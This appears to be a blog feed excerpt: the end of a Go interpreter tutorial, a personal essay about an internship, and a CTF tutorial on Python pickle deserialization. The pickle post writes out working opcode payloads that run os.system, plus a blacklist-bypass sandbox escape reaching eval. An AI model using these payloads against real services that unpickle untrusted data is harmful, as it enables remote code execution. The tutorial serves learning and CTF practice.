	<span class="nx">Node</span>
	<span class="nf">statementNode</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// All expression nodes implement this
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">Expression</span> <span class="kd">interface</span> <span class="p">{</span>
	<span class="nx">Node</span>
	<span class="nf">expressionNode</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></div><p>有了接口以后，我们需要为语法🌲创建一个根结点，</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kd">type</span> <span class="nx">Program</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">Statements</span> <span class="p">[]</span><span class="nx">Statement</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">Program</span><span class="p">)</span> <span class="nf">TokenLiteral</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">Statements</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Statements</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">TokenLiteral</span><span class="p">()</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">&#34;&#34;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>如果想把简单的let语句化为一颗AST,差不多是下面这样：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921165139.png" alt="image-20210921165137173"></p>
<p>那<code>LetStatement</code>的雏形差不多有了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kd">type</span> <span class="nx">LetStatement</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">Token</span> <span class="nx">token</span><span class="p">.</span><span class="nx">Token</span> <span class="c1">// the token.LET token
</span><span class="c1"></span>   <span class="nx">Name</span>  <span class="o">*</span><span class="nx">Identifier</span>
   <span class="nx">Value</span> <span class="nx">Expression</span>
<span class="p">}</span>
</code></pre></div><p>那么当我们读到一个token为let，就可以进入对let的解析函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">Parser</span><span class="p">)</span> <span class="nf">parseLetStatement</span><span class="p">()</span> <span class="o">*</span><span class="nx">ast</span><span class="p">.</span><span class="nx">LetStatement</span> <span class="p">{</span>	<span class="nx">stmt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ast</span><span class="p">.</span><span class="nx">LetStatement</span><span class="p">{</span><span class="nx">Token</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">curToken</span><span class="p">}</span>	<span class="k">if</span> <span class="p">!</span><span class="nx">p</span><span class="p">.</span><span class="nf">expectPeek</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">IDENT</span><span class="p">)</span> <span class="p">{</span>		<span class="k">return</span> <span class="kc">nil</span>	<span class="p">}</span>	<span class="nx">stmt</span><span class="p">.</span><span class="nx">Name</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">ast</span><span class="p">.</span><span class="nx">Identifier</span><span class="p">{</span><span class="nx">Token</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">curToken</span><span class="p">,</span> <span class="nx">Value</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">curToken</span><span class="p">.</span><span class="nx">Literal</span><span class="p">}</span>	<span class="k">if</span> <span class="p">!</span><span class="nx">p</span><span class="p">.</span><span class="nf">expectPeek</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">ASSIGN</span><span class="p">)</span> <span class="p">{</span>		<span class="k">return</span> <span class="kc">nil</span>	<span class="p">}</span>	<span class="nx">p</span><span class="p">.</span><span class="nf">nextToken</span><span class="p">()</span>	<span class="nx">stmt</span><span class="p">.</span><span class="nx">Value</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">parseExpression</span><span class="p">(</span><span class="nx">LOWEST</span><span class="p">)</span>	<span class="k">if</span> <span class="nx">p</span><span class="p">.</span><span class="nf">peekTokenIs</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">SEMICOLON</span><span class="p">)</span> <span class="p">{</span>		<span class="nx">p</span><span class="p">.</span><span class="nf">nextToken</span><span class="p">()</span>	<span class="p">}</span>	<span class="k">return</span> <span class="nx">stmt</span><span class="p">}</span>
</code></pre></div><p>比如对于<code>let x =5</code>, 可以得到</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921170351.png" alt="image-20210921170349884"></p>
<p>上面的例子的expression只是5，但比如<code>let x = 3+2*5</code>这种的表达式更为复杂，书中用到的方法叫<strong>Top Down Operator Precedence</strong>,或者<strong>Pratt Parsin</strong>。这里就不过多阐述，详细可参考<a href="https://tdop.github.io/">原文章</a>.</p>
<p>这样对于复杂表达式，我们也能解析：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921171859.png" alt="image-20210921171857411"></p>
<h3 id="优化器">优化器</h3>
<p>代码部分并没有着重优化，书上理论部分实属抽象😭，但这其实又是静态分析中最重要的环节，容我学习学习&hellip;&hellip;</p>
<h3 id="后端">后端</h3>
]]></content>
		</item>
		
		<item>
			<title>something0x02</title>
			<link>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</link>
			<pubDate>Tue, 17 Aug 2021 23:55:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</guid>
			<description>还是想还是写点什么，但不知道该怎么下笔。
对朋友而言，我算是一个倾诉欲望很强的人，不管是开心的事情也好，伤心的也罢。但如果真的记录下来，好像就都会变成比较丧，尽管我认为自己是一个比较乐观的人，我也希望可以给身边的人带来快乐，所以就会变得有些许矛盾。
实习这几天，晚上睡觉经常一直胡思乱想，为什么我会坚持做一些事情。
为什么我要写博客，可能刚开始看到了很多师傅，学长都有博客，心想如果我学着写会不会变成像他们这样厉害的人呢？到后来应该是大家都开始记录，有时候看到别人的访问或者评论还会暗暗的开心。
为什么我要打比赛呢，感觉~~&amp;mdash;&amp;ndash;~~
为什么我要学习安全。换在一年前，或者半年前，我一定会毫不犹豫的说，我喜欢。但在我打下这几个字的时候，我感到很焦虑。直到现在我都没有怀疑过我的初心，但我无法保证是是否还能坚守初衷。就好像写文章，变成了我更希望别人看到怎样的我，而不是我现在到底怎样。复现题目，也从之前的不求甚解，变成了 :哦就这样啊，那下次注意。如果说做的这么多都变成了刻意，那我应该得好好反思关于未来的事情。
也有可能是闲的慌了，容易胡思乱想，我更加能接受这个理由。至少在学校，和朋友们在一起，好像时间会慢很多，大家也不会去规划太多关于未来的事情。在家里有我那粘人的弟弟天天烦着我，每天乐呵乐呵也就过去了。哦对了提一嘴，弟弟的小升初成绩十分不错，让他狠狠的骄傲了一会，行吧，这六年来被我和爸妈三个人教训也挺幸苦的，发工资了就奖赏他一会，不过好像他更希望我能回家。
工作还是挺累的，自认为晚上回来还能学一些其他的知识，事实上是我想多了。偶然的机会，又重新读了读《山河之书》，不得不说，高中读这本书，和现在完全是不同的感觉。高中仅仅是欣赏他的文笔，但不喜欢他的思想，也可能是对应试教育的厌烦，总觉得能从景点中品出那么多感情的人很矫情，但现在又不一样。偶尔的共鸣也是可以接受的，许多风景，也会不自禁的带入不同的人随行，感觉很奇妙。
前几天看到通知说江苏最早15号返校，本来也和我没什么关系，实习的话最早好像也得20号走吧，但谈到学校还是会有一些触动，可能是学校里有让自己挂念的人，也可能是还没有提前适应社会的洗礼。不过现在实习的工作也挺nice，组长和学长都挺照顾的。
是随笔的话，也就这样零零散散的写吧，应该哪天觉得幼稚就删了。</description>
			<content type="html"><![CDATA[<p>还是想还是写点什么，但不知道该怎么下笔。</p>
<p>对朋友而言，我算是一个倾诉欲望很强的人，不管是开心的事情也好，伤心的也罢。但如果真的记录下来，好像就都会变成比较丧，尽管我认为自己是一个比较乐观的人，我也希望可以给身边的人带来快乐，所以就会变得有些许矛盾。</p>
<p>实习这几天，晚上睡觉经常一直胡思乱想，为什么我会坚持做一些事情。</p>
<p>为什么我要写博客，可能刚开始看到了很多师傅，学长都有博客，心想如果我学着写会不会变成像他们这样厉害的人呢？到后来应该是大家都开始记录，有时候看到别人的访问或者评论还会暗暗的开心。</p>
<p>为什么我要打比赛呢，感觉~~&mdash;&ndash;~~</p>
<p>为什么我要学习安全。换在一年前，或者半年前，我一定会毫不犹豫的说，我喜欢。但在我打下这几个字的时候，我感到很焦虑。直到现在我都没有怀疑过我的初心，但我无法保证是是否还能坚守初衷。就好像写文章，变成了我更希望别人看到怎样的我，而不是我现在到底怎样。复现题目，也从之前的不求甚解，变成了 :<code>哦就这样啊，那下次注意</code>。如果说做的这么多都变成了刻意，那我应该得好好反思关于未来的事情。</p>
<p>也有可能是闲的慌了，容易胡思乱想，我更加能接受这个理由。至少在学校，和朋友们在一起，好像时间会慢很多，大家也不会去规划太多关于未来的事情。在家里有我那粘人的弟弟天天烦着我，每天乐呵乐呵也就过去了。哦对了提一嘴，弟弟的小升初成绩十分不错，让他狠狠的骄傲了一会，行吧，这六年来被我和爸妈三个人教训也挺幸苦的，发工资了就奖赏他一会，不过好像他更希望我能回家。</p>
<p>工作还是挺累的，自认为晚上回来还能学一些其他的知识，事实上是我想多了。偶然的机会，又重新读了读《山河之书》，不得不说，高中读这本书，和现在完全是不同的感觉。高中仅仅是欣赏他的文笔，但不喜欢他的思想，也可能是对应试教育的厌烦，总觉得能从景点中品出那么多感情的人很矫情，但现在又不一样。偶尔的共鸣也是可以接受的，许多风景，也会不自禁的带入不同的人随行，感觉很奇妙。</p>
<p>前几天看到通知说江苏最早15号返校，本来也和我没什么关系，实习的话最早好像也得20号走吧，但谈到学校还是会有一些触动，可能是学校里有让自己挂念的人，也可能是还没有提前适应社会的洗礼。不过现在实习的工作也挺nice，组长和学长都挺照顾的。</p>
<p>是随笔的话，也就这样零零散散的写吧，应该哪天觉得幼稚就删了。</p>
]]></content>
		</item>
		
		<item>
			<title>pickle</title>
			<link>https://theoyu.top/posts/pickle/</link>
			<pubDate>Sat, 14 Aug 2021 23:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/pickle/</guid>
			<description>相关介绍看手册就行，写的不能再详细。
那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
import builtins import io import pickle safe_builtins = { &amp;#39;range&amp;#39;, &amp;#39;complex&amp;#39;, &amp;#39;set&amp;#39;, &amp;#39;frozenset&amp;#39;, &amp;#39;slice&amp;#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &amp;#34;builtins&amp;#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&amp;#34;global &amp;#39;%s.%s&amp;#39; is forbidden&amp;#34; % (module, name)) def restricted_loads(s): &amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&amp;#34;cos\nsystem\n(S&amp;#39;echo hello world&amp;#39;\ntR.&amp;#34; restricted_loads(test) 其中这里重写了find_class</description>
			<content type="html"><![CDATA[<p> 相关介绍看<a href="https://docs.python.org/zh-cn/3/library/pickle.html">手册</a>就行，写的不能再详细。</p>
<p>那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？</p>
<p>毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">builtins</span>
<span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">pickle</span>

<span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;range&#39;</span><span class="p">,</span>
    <span class="s1">&#39;complex&#39;</span><span class="p">,</span>
    <span class="s1">&#39;set&#39;</span><span class="p">,</span>
    <span class="s1">&#39;frozenset&#39;</span><span class="p">,</span>
    <span class="s1">&#39;slice&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="c1"># Only allow safe classes from builtins.</span>
        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_builtins</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="c1"># Forbid everything else.</span>
        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&#34;</span> <span class="o">%</span>
                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="s2">&#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34;</span>
    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>

<span class="n">test</span><span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;echo hello world&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span>
<span class="n">restricted_loads</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</code></pre></div><p>其中这里重写了<code>find_class</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png" alt="image-20210815152312283"></p>
<p>对<strong>module</strong>限制为<strong>builtins</strong>,并且只允许<strong>safe_builtins</strong>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">🌀  pickle  python3 main.py
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 32, in &lt;module&gt;
    restricted_loads<span class="o">(</span><span class="nb">test</span><span class="o">)</span>
  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 28, in restricted_loads
    <span class="k">return</span> RestrictedUnpickler<span class="o">(</span>io.BytesIO<span class="o">(</span>s<span class="o">))</span>.load<span class="o">()</span>
  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 22, in find_class
    raise pickle.UnpicklingError<span class="o">(</span><span class="s2">&#34;global &#39;%s.%s&#39; is forbidden&#34;</span> %
_pickle.UnpicklingError: global <span class="s1">&#39;os.system&#39;</span> is forbidden
</code></pre></div><p>而出题的话，当然不会直接限制死，往往都是黑名单漏几个，白名单多几个，去构造。这就需要我们手撕opcode，因为<code>__reduce__</code>只能返回一个元祖，沙盒逃逸的情况往往都是一长串的。</p>
<p>要解析opcode自然离不开PVM(Pickle Virtual Machine)，pvm涉及到三个部分：</p>
<ul>
<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
<li>栈区：最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。</li>
<li>存储区(memo)：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。大多数情况，我们并不需要用到这个部分。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png" alt=""></p>
<p>Pickletools是一个利于我们反汇编pickle的工具，举一个例子看看</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,))</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
<span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</code></pre></div><p>同时，<code>pickle.dumps</code>一共有6种形式，其中版本0最利于我们观察，越往后为了效率增加了很多字符，不过好在load是向前兼容的，所以我们后面的分析都采用版本0</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cposix
system
p0
<span class="o">(</span>Vwhoami
p1
tp2
Rp3
.
    0: c    GLOBAL     <span class="s1">&#39;posix system&#39;</span>
   14: p    PUT        <span class="m">0</span>
   17: <span class="o">(</span>    MARK
   18: V        UNICODE    <span class="s1">&#39;whoami&#39;</span>
   26: p        PUT        <span class="m">1</span>
   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span>
   30: p    PUT        <span class="m">2</span>
   33: R    REDUCE
   34: p    PUT        <span class="m">3</span>
   37: .    STOP
highest protocol among <span class="nv">opcodes</span> <span class="o">=</span> <span class="m">0</span>

</code></pre></div><p>关于opcode的语法，官方<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py">源码</a>有点含糊，不过有师傅总结下来了：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S&rsquo;xxx'\n（也可以使用双引号、'等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody>
</table>
<p>结合语法，重新分析一下opcode</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">    0: c    GLOBAL     <span class="s1">&#39;posix system  &#39;</span> <span class="c1">#对象入栈 unix为posix windows为nt</span>
   14: p    PUT        <span class="m">0</span> 						  	<span class="c1">#存储到memo的0位置</span>
   17: <span class="o">(</span>    MARK  									    <span class="c1">#向栈中压入一个MARK标记 左括号标志符</span>
   18: V        UNICODE    <span class="s1">&#39;whoami&#39;</span>     <span class="c1">#压入一个字符串</span>
   26: p        PUT        <span class="m">1</span>            <span class="c1">#存储到memo的1位置</span>
   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span> <span class="c1">#在栈中寻找上一个MARK标记，将其和中间内容出栈，参数形成元祖入栈</span>
   30: p    PUT        2							  <span class="c1">#存储到memo的2位置</span>
   33: R    REDUCE											<span class="c1"># system(&#34;whoami&#34;)出栈，结果如栈</span>
   34: p    PUT        3								<span class="c1"># 结果存储到memo3</span>
   37: .    STOP												<span class="c1"># 停止</span>
</code></pre></div><p>结合语法来说的话，还是可以理解了，加上memo上的操作可以省略，简化为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pickle</span>

<span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;cposix
</span><span class="s1">system
</span><span class="s1">(Vwhoami
</span><span class="s1">tR.&#39;&#39;&#39;</span>

<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1">#theoyu</span>
</code></pre></div><p>上面用了<strong>R</strong>做了函数执行，同时<strong>i</strong>，<strong>o</strong>稍作修改也可以达到一样的效果</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># o</span>
<span class="s1">&#39;&#39;&#39;(cos
</span><span class="s1">system
</span><span class="s1">S&#39;whoami&#39;
</span><span class="s1">o.&#39;&#39;&#39;</span>
<span class="n">pickletools</span><span class="o">-&gt;</span>
    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
    <span class="mi">1</span><span class="p">:</span> <span class="n">c</span>        <span class="n">GLOBAL</span>     <span class="s1">&#39;os system&#39;</span>
   <span class="mi">12</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s1">&#39;whoami&#39;</span>
   <span class="mi">22</span><span class="p">:</span> <span class="n">o</span>        <span class="n">OBJ</span>        <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
   <span class="mi">23</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>


<span class="c1"># i</span>
<span class="s1">&#39;&#39;&#39;(S&#39;whoami&#39;
</span><span class="s1">ios
</span><span class="s1">system
</span><span class="s1">.&#39;&#39;&#39;</span>
<span class="n">pickletools</span><span class="o">-&gt;</span>
    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
    <span class="mi">1</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s1">&#39;whoami&#39;</span>
   <span class="mi">11</span><span class="p">:</span> <span class="n">i</span>        <span class="n">INST</span>       <span class="s1">&#39;os system&#39;</span> <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
   <span class="mi">22</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>

</code></pre></div><p>拿p神经典的code_break试试：</p>
<ul>
<li>模块白名单：<code>builtins</code></li>
<li>子模块黑名单：<code>'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'</code></li>
</ul>
<p>因为只禁用了子模块，我们可以先通过一轮global+get重新筛选出builtins，再构造即可。</p>
<p>先构造<code>__builtins__.globals().get('__builtins__')</code>拿到可以执行eval的builtins,再执行<code>builtins.getattr(builtins, 'eval'),('__import__(&quot;os&quot;).system(&quot;whoami&quot;)',)</code>即可。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">cbuiltins</span>
<span class="nb">getattr</span>
<span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">getattr</span>
<span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">dict</span>
<span class="n">S</span><span class="s1">&#39;get&#39;</span>
<span class="n">tR</span><span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">globals</span>
<span class="p">(</span><span class="n">tRS</span><span class="s1">&#39;__builtins__&#39;</span>   <span class="c1">#拿到bultins</span>
<span class="n">tRS</span><span class="s1">&#39;eval&#39;</span>
<span class="n">tRp1</span>
<span class="p">(</span><span class="n">S</span><span class="s1">&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span>
<span class="n">tR</span><span class="o">.</span>
</code></pre></div><p>不过这样看起来还是有一些费劲的,学长@iv4n写的<a href="https://github.com/eddieivan01/pker">pker</a>利用遍历AST结点自动化构建解决了这个问题</p>
<p>上述例子只需要构造：</p>
<pre><code class="language-pker" data-lang="pker">getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__(&quot;os&quot;).system(&quot;whoami&quot;)')
return
</code></pre><p>其中</p>
<pre><code>GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
